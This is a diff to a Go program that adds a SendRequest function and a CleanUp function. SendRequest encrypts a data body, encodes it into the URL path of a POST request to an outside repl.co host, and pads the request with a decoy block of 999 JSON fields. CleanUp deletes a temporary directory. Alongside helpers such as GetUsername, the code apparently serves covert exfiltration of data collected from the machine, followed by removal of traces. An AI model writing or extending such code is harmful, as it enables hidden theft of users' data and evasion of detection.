@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/sha256"
 	"encoding/hex"
@@ -8,9 +9,11 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"net/http"
 	"os"
 	"os/user"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -29,6 +32,42 @@ var (
 
 	HEADERS [999]string
 )
+
+func CleanUp() {
+	_ = os.RemoveAll(TempFileDir)
+}
+
+func SendRequest(body string, ip string) {
+	HashKey := RandIntBytes(3)
+	HashKeyInt, _ := strconv.Atoi(HashKey)
+
+	GenerateHeaders()
+
+	hash, nonce := CryptSign(ip, HashKey)
+
+	HEADERS[HashKeyInt] = nonce
+
+	//fmt.Println(HEADERS)
+
+	var p string = "{"
+
+	for i := 0; i < 999; i++ {
+		if i == 998 {
+			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
+			continue
+		}
+		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","
+
+	}
+	p = p + "}"
+
+	endpoint := Encrypt(body, strings.Join(strings.Split(hash, "")[0:32], ""))
+	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
+	req.Header.Set("Content-Type", "application/json")
+
+	client := &http.Client{}
+	client.Do(req)
+}
 
 func GetUsername() string {
 	user, err := user.Current()
